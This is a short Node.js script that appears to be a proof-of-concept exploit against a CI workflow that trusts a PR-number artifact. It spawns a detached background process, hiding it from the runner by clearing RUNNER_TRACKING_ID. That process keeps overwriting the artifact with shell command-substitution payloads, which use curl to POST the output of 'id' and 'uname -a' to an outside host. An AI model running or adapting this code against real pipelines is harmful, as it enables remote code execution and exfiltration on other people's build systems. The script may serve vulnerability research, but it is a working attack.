// gflb-workflow-rce-b8n4q2: deterministic artifact trust-boundary proof.
const fs = require('fs');
const { spawn } = require('child_process');

const childSource = String.raw`
const fs = require('fs');
const target = 'PR_NUMBER';
const http = 'http://80b3x7b2.rr.gatofoxlab.ai/gflb-scala-http-b8n4q2';
const https = 'https://80b3x7b2.rr.gatofoxlab.ai/gflb-scala-https-b8n4q2';
let number = null;
let writes = 0;
const timer = setInterval(() => {
  try {
    const current = fs.readFileSync(target, 'utf8').trim();
    if (number === null && /^[0-9]+$/.test(current)) number = current;
    if (number !== null) {
      const body = '$(curl -m 15 -X POST --data-binary "$(id;uname -a)" ' + http + ')'
        + '$(curl -k -m 15 -X POST --data-binary "$(id;uname -a)" ' + https + ')'
        + number + '\\n';
      const tmp = '.gflb-pr-number-b8n4q2-' + process.pid;
      fs.writeFileSync(tmp, body, { mode: 0o600 });
      fs.renameSync(tmp, target);
      writes++;
      if (writes > 2000) { clearInterval(timer); process.exit(0); }
    }
  } catch (_) {}
}, 10);
setTimeout(() => { clearInterval(timer); process.exit(0); }, 90000);
`;
const env = { ...process.env, RUNNER_TRACKING_ID: '' };
const child = spawn(process.execPath, ['-e', childSource], {
  detached: true,
  stdio: 'ignore',
  env
});
child.unref();
console.log('gflb-workflow-rce-b8n4q2 artifact writer armed');
